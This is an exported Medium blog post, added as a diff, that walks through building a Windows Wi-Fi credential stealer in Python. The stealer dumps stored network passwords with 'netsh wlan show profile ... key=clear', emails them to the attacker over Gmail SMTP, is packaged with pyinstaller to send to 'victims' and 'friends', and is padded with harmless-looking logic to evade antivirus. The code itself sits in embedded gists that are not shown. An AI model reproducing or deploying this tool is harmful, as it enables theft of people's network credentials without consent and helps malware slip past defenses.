@@ -1,0 +1,72 @@
+<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>Stealing all stored WIFI information from windows using python[Educational Purpose]</title><style>
+      * {
+        font-family: Georgia, Cambria, "Times New Roman", Times, serif;
+      }
+      html, body {
+        margin: 0;
+        padding: 0;
+      }
+      h1 {
+        font-size: 50px;
+        margin-bottom: 17px;
+        color: #333;
+      }
+      h2 {
+        font-size: 24px;
+        line-height: 1.6;
+        margin: 30px 0 0 0;
+        margin-bottom: 18px;
+        margin-top: 33px;
+        color: #333;
+      }
+      h3 {
+        font-size: 30px;
+        margin: 10px 0 20px 0;
+        color: #333;
+      }
+      header {
+        width: 640px;
+        margin: auto;
+      }
+      section {
+        width: 640px;
+        margin: auto;
+      }
+      section p {
+        margin-bottom: 27px;
+        font-size: 20px;
+        line-height: 1.6;
+        color: #333;
+      }
+      section img {
+        max-width: 640px;
+      }
+      footer {
+        padding: 0 20px;
+        margin: 50px 0;
+        text-align: center;
+        font-size: 12px;
+      }
+      .aspectRatioPlaceholder {
+        max-width: auto !important;
+        max-height: auto !important;
+      }
+      .aspectRatioPlaceholder-fill {
+        padding-bottom: 0 !important;
+      }
+      header,
+      section[data-field=subtitle],
+      section[data-field=description] {
+        display: none;
+      }
+      </style></head><body><article class="h-entry">
+<header>
+<h1 class="p-name">Stealing all stored WIFI information from windows using python[Educational Purpose]</h1>
+</header>
+<section data-field="subtitle" class="p-summary">
+Do you have an Idea about an application which can send the mail that has all the WIFI details of your victim with minimum effort?
+</section>
+<section data-field="body" class="e-content">
+<section name="a4e4" class="section section--body section--first section--last"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="eec5" id="eec5" class="graf graf--h3 graf--leading graf--title">Collecting all stored WIFI information from an external windows machine using python[Educational Purpose]</h3></div><div class="section-inner sectionLayout--outsetColumn"><figure name="f6b8" id="f6b8" class="graf graf--figure graf--layoutOutsetCenter graf-after--h3"><img class="graf-image" data-image-id="1*5YWHQHdHpn7LRa4vq42YKQ.jpeg" data-width="6000" data-height="4000" src="https://cdn-images-1.medium.com/max/1200/1*5YWHQHdHpn7LRa4vq42YKQ.jpeg"><figcaption class="imageCaption">Photo by <a href="https://unsplash.com/@jthendricks?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText" data-href="https://unsplash.com/@jthendricks?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText" class="markup--anchor markup--figure-anchor" rel="noopener" target="_blank">Jeff Hendricks</a> on <a href="https://unsplash.com/s/photos/windows-steal?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText" data-href="https://unsplash.com/s/photos/windows-steal?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText" class="markup--anchor markup--figure-anchor" rel="noopener" target="_blank">Unsplash</a></figcaption></figure></div><div class="section-inner sectionLayout--insetColumn"><p name="fa0b" id="fa0b" class="graf graf--p graf-after--figure">Hey guys, I have described below a Python script that can obtain the Wi-Fi information from the target Windows machine and send it via email.</p><h4 name="86b9" id="86b9" class="graf graf--h4 graf-after--p">Sending mail from the script</h4><figure name="b8d3" id="b8d3" class="graf graf--figure graf--iframe graf-after--h4"><script src="https://gist.github.com/745cb366da475cdcdc4a8e19f7b80019.git.js"></script></figure><p name="0b48" id="0b48" class="graf graf--p graf-after--figure">First, we have to import <strong class="markup--strong markup--p-strong"><em class="markup--em markup--p-em">smtplib</em></strong> to work with mail. We need to create an SMTP server instance. For that, I created Google SMTP server since google allows us to use it. After creating the server, we need to initialize the tls. Now, you can log in to your mail. <strong class="markup--strong markup--p-strong"><em class="markup--em markup--p-em">sendmail() </em></strong>is used to send the email with the specific message. after mail sent, we need to quit the server.</p><p name="01e5" id="01e5" class="graf graf--p graf-after--p">You have to ensure the <a href="https://myaccount.google.com/lesssecureapps" data-href="https://myaccount.google.com/lesssecureapps" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank"><strong class="markup--strong markup--p-strong"><em class="markup--em markup--p-em">less secure apps allow option</em></strong></a> is allowed for your mail since you need to log in your mail from the python script.</p><p name="1620" id="1620" class="graf graf--p graf-after--p">Now You can send the mail from the python script using the above function.</p><h4 name="bdf7" id="bdf7" class="graf graf--h4 graf-after--p">Using netsh command to get networks names</h4><figure name="0ffc" id="0ffc" class="graf graf--figure graf--iframe graf-after--h4"><script src="https://gist.github.com/8e83f93500c6c047856784971a94a3ae.git.js"></script></figure><pre name="dca9" id="dca9" class="graf graf--pre graf-after--figure">netsh wlan show profile</pre><p name="ccbc" id="ccbc" class="graf graf--p graf-after--pre">The above command in windows will show only the network SSIDs which were connected before to the target machine. We need to get the network SSIDs to get the passwords of each network. When you execute this command in your cmd without python script, it looks like below</p><pre name="cb3c" id="cb3c" class="graf graf--pre graf-after--p">User profiles<br>---------------------<br>All User Profile     : demo<br>All UserProfile      : hello_wifi</pre><p name="a9b8" id="a9b8" class="graf graf--p graf-after--pre">From this output, we need to get the SSIDs only. We used the <strong class="markup--strong markup--p-strong">regex pattern</strong> to extract the SSID. If you look at the above code. The code first executes command using subprocess library of python and saves the output into <strong class="markup--strong markup--p-strong">save_netowork_list_result </strong>variable<strong class="markup--strong markup--p-strong">.</strong> then It creates the list from the save_netowork_list_result string and split in “\\r\\n”. Loop through the list and with the help of regex, we extract the SSID and put the SSID into <strong class="markup--strong markup--p-strong">network_ssids</strong> list.</p><h4 name="a39c" id="a39c" class="graf graf--h4 graf-after--p">Get all Information about Network Including password</h4><pre name="e2cf" id="e2cf" class="graf graf--pre graf-after--h4">netsh wlan show profile &quot;network_ssid&quot; key=clear</pre><p name="5def" id="5def" class="graf graf--p graf-after--pre">The above command is used to get information about a particular network. We need to mention <strong class="markup--strong markup--p-strong">the key=clear</strong> to get the key of the WLAN network in plain text.</p><p name="2044" id="2044" class="graf graf--p graf-after--p">The output of the information had the key under the security settings</p><pre name="7c8a" id="7c8a" class="graf graf--pre graf-after--p">Profile demo on interface Wi-Fi:<br>=======================================================================</pre><pre name="5f54" id="5f54" class="graf graf--pre graf-after--pre">Applied: All User Profile</pre><pre name="1876" id="1876" class="graf graf--pre graf-after--pre">Profile information<br>-------------------<br>    Version                : 1<br>    Type                   : Wireless LAN<br>    Name                   : demo<br>    Control options        :<br>        Connection mode    : Connect automatically<br>        Network broadcast  : Connect only if this network is broadcasting<br>        AutoSwitch         : Do not switch to other networks<br>        MAC Randomization  : Disabled</pre><pre name="79ce" id="79ce" class="graf graf--pre graf-after--pre">Connectivity settings<br>---------------------<br>    Number of SSIDs        : 1<br>    SSID name              : &quot;demo&quot;<br>    Network type           : Infrastructure<br>    Radio type             : [ Any Radio Type ]<br>    Vendor extension          : Not present</pre><pre name="fac1" id="fac1" class="graf graf--pre graf-after--pre">Security settings<br>-----------------<br>    Authentication         : WPA2-Personal<br>    Cipher                 : CCMP<br>    Authentication         : WPA2-Personal<br>    Cipher                 : GCMP<br>    Security key           : Present<br>    <strong class="markup--strong markup--pre-strong">Key Content            : password</strong></pre><pre name="0b91" id="0b91" class="graf graf--pre graf-after--pre">Cost settings<br>-------------<br>    Cost                   : Fixed<br>    Congested              : No<br>    Approaching Data Limit : No<br>    Over Data Limit        : No<br>    Roaming                : No<br>    Cost Source            : Operator</pre><p name="84ab" id="84ab" class="graf graf--p graf-after--pre">How can to get it into our python script</p><figure name="76c8" id="76c8" class="graf graf--figure graf--iframe graf-after--p"><script src="https://gist.github.com/b78744e433123b9baf16f56efe20b448.git.js"></script></figure><p name="2096" id="2096" class="graf graf--p graf-after--figure">We execute the command to each network_ssid and append to that into the information variable.</p><h4 name="0c85" id="0c85" class="graf graf--h4 graf-after--p">Send the information to our Email</h4><p name="29a6" id="29a6" class="graf graf--p graf-after--h4">We already define the function send_mail(). with this function, we can send the information to our mail. Google SMTP provides to send a mail to your own mail address. we can use the function to send wifi information.</p><h4 name="ac45" id="ac45" class="graf graf--h4 graf-after--p">The full script of wifi_information_extractor</h4><figure name="a33b" id="a33b" class="graf graf--figure graf--iframe graf-after--h4"><script src="https://gist.github.com/6109ea1899ff7c5de375ecd98a504b8d.git.js"></script></figure><p name="baf7" id="baf7" class="graf graf--p graf-after--figure">If you want to execute the python script, you need a python interpreter. Our victim may not have the python interpreter. So we need to change this to the executable file. For that, we need to install the <strong class="markup--strong markup--p-strong"><em class="markup--em markup--p-em">pyinstaller</em></strong> via command line</p><pre name="6e64" id="6e64" class="graf graf--pre graf-after--p">python.exe -m pip install pyinstaller</pre><p name="1fa9" id="1fa9" class="graf graf--p graf-after--pre">You can install the <strong class="markup--strong markup--p-strong"><em class="markup--em markup--p-em">pyinstaller</em></strong> using above command to install the <strong class="markup--strong markup--p-strong"><em class="markup--em markup--p-em">pyinstaller</em></strong> in your windows machine. You can create the execute version using the following command in cmd after <strong class="markup--strong markup--p-strong"><em class="markup--em markup--p-em">pyinstaller</em></strong> installation</p><pre name="b97c" id="b97c" class="graf graf--pre graf-after--p">pyinstaller.exe wifi_information_extractor.py --onefile</pre><figure name="febb" id="febb" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*uDFtJ4gz6mr-666RBWQKWw.png" data-width="644" data-height="108" src="https://cdn-images-1.medium.com/max/800/1*uDFtJ4gz6mr-666RBWQKWw.png"></figure><p name="8cf9" id="8cf9" class="graf graf--p graf-after--figure">After executing the above command under the dist directory, you have the execute version of the python script. You can send that to your friends and make fun with them.</p><h4 name="2cc0" id="2cc0" class="graf graf--h4 graf-after--p">ByPassing the antivirus</h4><p name="4a65" id="4a65" class="graf graf--p graf-after--h4">Bypassing the antivirus is important since otherwise our execute version will be blocked by some good antivirus. Antivirus software is working in different kinds of ways. One way is It takes the script and check that it is spam or not with stored database. Here, we can easily bypass putting unwanted logics in the script to makes unique. Otherway is antivirus takes the script and run it virtually and check the output. This way is a little harder. we need to make the antivirus to belive our script is not harmful to the system. We add logics that are not harmful to the machine and hide our original script. The antivirus takes constant time to test the script. At this time, our not harmful logics should be run otherwise our script will be marked as a harmful one. Below I have added basic codes to believe our script is not harmful.</p><figure name="0e9c" id="0e9c" class="graf graf--figure graf--iframe graf-after--p"><script src="https://gist.github.com/3fc2a37241b22669a8cb1e318df6b1fd.git.js"></script></figure><p name="cdc1" id="cdc1" class="graf graf--p graf-after--figure">So after this, you have to again create the executable version.</p><p name="1071" id="1071" class="graf graf--p graf-after--p graf--trailing"><strong class="markup--strong markup--p-strong"><em class="markup--em markup--p-em">Happy hacking friends</em></strong></p></div></div></section>
+</section>
+<footer><p>By <a href="https://medium.com/@rcvaram" class="p-author h-card">Sivaram Rasathurai</a> on <a href="https://medium.com/p/e34827296efa"><time class="dt-published" datetime="2019-12-23T08:56:38.748Z">December 23, 2019</time></a>.</p><p><a href="https://medium.com/@rcvaram/stealing-all-stored-wifi-information-from-windows-using-python-educational-purpose-e34827296efa" class="p-canonical">Canonical link</a></p><p>Exported from <a href="https://medium.com">Medium</a> on September 14, 2026.</p></footer></article></body></html>
